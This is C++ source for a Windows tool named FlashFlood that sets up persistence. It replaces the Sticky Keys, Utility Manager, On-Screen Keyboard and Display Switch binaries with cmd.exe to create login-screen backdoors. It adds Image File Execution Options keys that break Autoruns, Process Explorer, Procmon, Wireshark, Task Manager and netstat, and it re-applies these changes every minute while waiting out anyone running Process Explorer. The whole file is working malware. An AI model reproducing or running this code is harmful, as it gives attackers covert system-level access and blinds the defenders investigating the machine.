#include <iostream>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <atomic>

void ascii_art() {
    //prints FlashFlood ascii art
    std::cout << "\033[96m   ________ ___       ________  ________  ___  ___  ________ ___       ________  ________  ________\033[0m" << std::endl;
    std::cout << "\033[96m  |\\  _____\\\\  \\     |\\   __  \\|\\   ____\\|\\  \\|\\  \\|\\  _____\\\\  \\     |\\   __  \\|\\   __  \\|\\   ___ \\\033[0m" << std::endl;
    std::cout << "\033[96m  \\ \\  \\__/\\ \\  \\    \\ \\  \\|\\  \\ \\  \\___|\\ \\  \\\\\\  \\ \\  \\__/\\ \\  \\    \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\_|\\ \\\033[0m" << std::endl;
    std::cout << "\033[96m   \\ \\   __\\\\ \\  \\    \\ \\   __  \\ \\_____  \\ \\   __  \\ \\   __\\\\ \\  \\    \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\ \\\\ \\\033[0m" << std::endl;
    std::cout << "\033[96m    \\ \\  \\_| \\ \\  \\____\\ \\  \\ \\  \\|____|\\  \\ \\  \\ \\  \\ \\  \\_| \\ \\  \\____\\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\_\\\\ \\\033[0m" << std::endl;
    std::cout << "\033[96m     \\ \\__\\   \\ \\_______\\ \\__\\ \\__\\____\\_\\  \\ \\__\\ \\__\\ \\__\\   \\ \\_______\\ \\_______\\ \\_______\\ \\_______\\\033[0m" << std::endl;
    std::cout << "\033[96m      \\|__|    \\|_______|\\|__|\\|__|\\_________\\|__|\\|__|\\|__|    \\|_______|\\|_______|\\|_______|\\|_______|\033[0m" << std::endl;
    std::cout << "\033[96m                                  \\|_________|                                                          \033[0m" << std::endl;
}

void error_handling(int status, const std::string& command) {
    if (status != 0) {
        std::cout << "\033[1;31mError Running Command: \033[0m" << command << std::endl;
        exit(EXIT_FAILURE);
    }
}

void priv_esc() {
    std::vector<std::pair<std::string, std::string>> files = {
        {"sethc.exe", "Sticky Keys"},
        {"utilman.exe", "Utility Manager"},
        {"osk.exe", "On Screen Keyboard"},
        {"displayswitch.exe", "Display"}
    };

    for (const auto& file_pair : files) {
        const std::string& filename = file_pair.first;
        const std::string& desc = file_pair.second;
        std::string path = "C:\\Windows\\System32\\" + filename;

        // Check if the file exists
        if (GetFileAttributesA(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
            std::cout << "\033[1;33m\tSkipped " << desc << " - File not found: " << filename << "\033[0m" << std::endl;
            continue;
        }

        // Grant ownership and full permissions
        std::string takeownCmd = "takeown /f \"" + path + "\" >nul 2>&1";
        std::string icaclsCmd = "icacls \"" + path + "\" /grant administrators:F >nul 2>&1";

        error_handling(system(takeownCmd.c_str()), takeownCmd.c_str());
        error_handling(system(icaclsCmd.c_str()), icaclsCmd.c_str());

        std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for " << desc << "\033[0m" << std::endl;
    }
}

int findProcess(const wchar_t* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    int pid = 0;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32W);
    hResult = Process32FirstW(hSnapshot, &pe);

    while (hResult) {
        if (wcscmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32NextW(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

void terminateProcess(const wchar_t* procname) {
    // Convert wchar_t* to std::string
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, procname, -1, NULL, 0, NULL, NULL);
    std::string procnameStr(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, procname, -1, &procnameStr[0], size_needed, NULL, NULL);

    // Find the process
    int pid = findProcess(procname);
    if (pid == 0) {
        std::cerr << "\t\033[1;33mWARNING: Process \"" << procnameStr << "\" not found.\033[0m" << std::endl;
        return;
    }

    // Terminate using Windows API (completely silent)
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "\t\033[1;31mFAILED to open process \"" << procnameStr << "\" (PID " << pid << ")\033[0m" << std::endl;
        return;
    }

    if (TerminateProcess(hProcess, 0)) {
        std::cout << "\t\033[1;32mSUCCESS: Terminated \"" << procnameStr << "\" (PID " << pid << ")\033[0m" << std::endl;
    }
    else {
        std::cerr << "\t\033[1;31mFAILED to terminate \"" << procnameStr << "\" (PID " << pid << ")\033[0m" << std::endl;
    }
    CloseHandle(hProcess);
}

void clear_screen() {
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hStdOut == INVALID_HANDLE_VALUE) return;

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    if (!GetConsoleScreenBufferInfo(hStdOut, &csbi)) return;

    DWORD cellCount = csbi.dwSize.X * csbi.dwSize.Y;
    COORD homeCoords = { 0, 0 };
    DWORD count;

    if (!FillConsoleOutputCharacter(hStdOut, ' ', cellCount, homeCoords, &count)) return;

    if (!FillConsoleOutputAttribute(hStdOut, csbi.wAttributes, cellCount, homeCoords, &count)) return;

    SetConsoleCursorPosition(hStdOut, homeCoords);
    std::cout << std::flush;  //flushes
}

void enableAnsi() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return;

    DWORD dwMode = 0;
    if (!GetConsoleMode(hOut, &dwMode)) return;

    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}

void enableUnbufferedOutput() {
    // Disable buffering for cout and cerr
    std::cout.setf(std::ios::unitbuf);
    std::cerr.setf(std::ios::unitbuf);

    // For C-style stdout/stderr (redundant but thorough)
    setvbuf(stdout, nullptr, _IONBF, 0);
    setvbuf(stderr, nullptr, _IONBF, 0);
}

void create_backups() {
    std::vector<std::pair<std::string, std::string>> files = {
        {"sethc.exe", "Sticky Keys"},
        {"utilman.exe", "Utility Manager"},
        {"osk.exe", "On Screen Keyboard"},
        {"displayswitch.exe", "Display"}
    };

    std::cout << "Creating Backups..." << std::endl;
    for (const auto& file_pair : files) {
        const std::string& filename = file_pair.first;
        const std::string& desc = file_pair.second;
        std::string path = "C:\\Windows\\System32\\" + filename;
        std::string backupPath = "C:\\Windows\\System32\\old-" + filename;

        if (GetFileAttributesA(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
            std::cout << "\033[1;33m\tSkipped " << desc << " - File not found: " << filename << "\033[0m" << std::endl;
            continue;
        }

        if (GetFileAttributesA(backupPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::cout << "\033[1;33m\tBackup already exists: " << filename << "\033[0m" << std::endl;
            continue;
        }

        std::string backupCmd = "copy \"" + path + "\" \"" + backupPath + "\" >nul 2>&1";
        if (system(backupCmd.c_str()) == 0) {
            std::cout << "\033[1;32m\tBackup created for " << desc << "\033[0m" << std::endl;
        }
        else {
            std::cout << "\033[1;31m\tFailed to backup " << desc << "\033[0m" << std::endl;
        }
    }
}

void cleanup() {
    std::vector<std::pair<std::string, std::string>> files = {
        {"old-sethc.exe", "sethc.exe"},
        {"old-utilman.exe", "utilman.exe"},
        {"old-osk.exe", "osk.exe"},
        {"old-displayswitch.exe", "displayswitch.exe"}
    };

    for (const auto& filePair : files) {
        const std::string& backup = filePair.first;
        const std::string& original = filePair.second;
        std::string backupPath = "C:\\Windows\\System32\\" + backup;
        std::string originalPath = "C:\\Windows\\System32\\" + original;

        // Skip if the original file doesn't exist (e.g., osk.exe missing)
        if (GetFileAttributesA(originalPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            continue;
        }

        // Delete current file
        std::string delCmd = "del /f \"" + originalPath + "\" >nul 2>&1";
        system(delCmd.c_str());

        // Restore backup
        std::string moveCmd = "move /y \"" + backupPath + "\" \"" + originalPath + "\" >nul 2>&1";
        if (system(moveCmd.c_str()) == 0) {
            std::cout << "\033[1;32m\tRestored: " << original << "\033[0m" << std::endl;
        }
    }
}

bool backup_file(const std::string& originalPath) {
    std::string backupPath = "C:\\Windows\\System32\\old-" + originalPath.substr(originalPath.find_last_of("\\") + 1);

    // Skip if backup already exists
    if (GetFileAttributesA(backupPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        return true;
    }

    std::string backupCmd = "copy \"" + originalPath + "\" \"" + backupPath + "\" >nul 2>&1";
    if (system(backupCmd.c_str()) != 0) {
        std::cout << "\033[1;31m\tFailed to backup: " << originalPath << "\033[0m" << std::endl;
        return false;
    }
    return true;
}

void sticky_keys() {
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f >nul 2>&1"),
        "reg add StickyKeys registry");

    std::string originalPath = "C:\\Windows\\System32\\sethc.exe";
    if (backup_file(originalPath)) {
        error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe >nul 2>&1"), "rename sethc.exe");
        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "copy cmd.exe to sethc.exe");
        std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
    }
}

// Apply the same pattern to other functions:
void utility_manager() {
    std::string originalPath = "C:\\Windows\\System32\\utilman.exe";
    if (backup_file(originalPath)) {
        error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe >nul 2>&1"), "rename utilman.exe");
        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "copy cmd.exe to utilman.exe");
        std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
    }
}

void on_screen_keyboard() {
    std::string originalPath = "C:\\Windows\\System32\\osk.exe";
    if (GetFileAttributesA(originalPath.c_str()) != INVALID_FILE_ATTRIBUTES && backup_file(originalPath)) {
        error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe >nul 2>&1"), "rename osk.exe");
        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe >nul 2>&1"), "copy cmd.exe to osk.exe");
        std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
    }
    else {
        std::cout << "\033[1;33m\tSkipped On-Screen Keyboard (file not found)\033[0m" << std::endl;
    }
}

void display_switch() {
    std::string originalPath = "C:\\Windows\\System32\\displayswitch.exe";
    if (backup_file(originalPath)) {
        error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe >nul 2>&1"), "rename displayswitch.exe");
        error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "copy cmd.exe to displayswitch.exe");
        std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
    }
}

void ifeo_keys() {
    //switches all important thrunting tools to execute conhost.exe
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Autoruns IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Process Explorer IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Process Monitor IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Strings IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded TCPView IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wireshark.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wireshark.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Wireshark IFEO Registry Key\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Task Manager IFEO Registry Key\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskschd.msc\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskschd.msc\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Task Scheduler IFEO Registry Key\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Netstat IFEO Registry Key\033[0m" << std::endl;
}

void startup() {
    clear_screen();

    //runs FlashFlood art
    ascii_art();

    //grants administrator permissions to all backdoor executables
    std::cout << "Gaining Permissions..." << std::endl;
    priv_esc();

    //enables all windows hotkeys
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f >nul 2>&1"),
        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");
    std::cout << "\033[1;32m\tSuccessfully Enabled All Windows Hotkeys\033[0m" << std::endl;
}

void execute_backdoors() {
    sticky_keys();
    std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
    utility_manager();
    std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
    on_screen_keyboard();
    std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
    display_switch();
    std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
}

void terminateBackdoors() {
    //kills previous sessions
    std::vector<std::wstring> processList = {
        L"sethc.exe", L"utilman.exe", L"osk.exe", L"displayswitch.exe"
    };

    for (const auto& proc : processList) {
        if (findProcess(proc.c_str()) != 0) {
            terminateProcess(proc.c_str());
        }
    }
}

int run() {
    enableAnsi();
    enableUnbufferedOutput();
    startup(); // Runs basic startup (clear, ASCII art, admin perms, hotkeys, cleanup)

    create_backups(); // Creates backups FIRST

    std::cout << "Terminating Processes..." << std::endl;
    terminateBackdoors();

    std::cout << "Cleaning Up Files..." << std::endl;
    cleanup();

    std::cout << "Executing Backdoors..." << std::endl;
    execute_backdoors();

    std::cout << "Adding IFEO Registry Keys..." << std::endl;
    ifeo_keys();

    return 0;
}

int main() {
    enableUnbufferedOutput();

    while (true) {
        bool isProcExpRunning = (findProcess(L"procexp.exe") != 0 || findProcess(L"procexp64.exe") != 0);

        if (isProcExpRunning) {
            std::cout << "\033[1;33mProcess Explorer detected. Waiting up to 15 minutes...\033[0m" << std::endl;

            bool closedEarly = false;
            for (int i = 0; i < 15; i++) {
                std::this_thread::sleep_for(std::chrono::minutes(1));
                if (findProcess(L"procexp.exe") == 0 && findProcess(L"procexp64.exe") == 0) {
                    closedEarly = true;
                    break;
                }
            }

            if (!closedEarly) {
                std::cout << "\033[1;33mContinuing after 15-minute wait.\033[0m" << std::endl;
            }
            else {
                std::cout << "\033[1;32mProcess Explorer closed early. Resuming...\033[0m" << std::endl;
            }
        }

        run();
        std::cout << "\033[1;33mWaiting 1 Minute to Rerun...\033[0m" << std::endl;
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}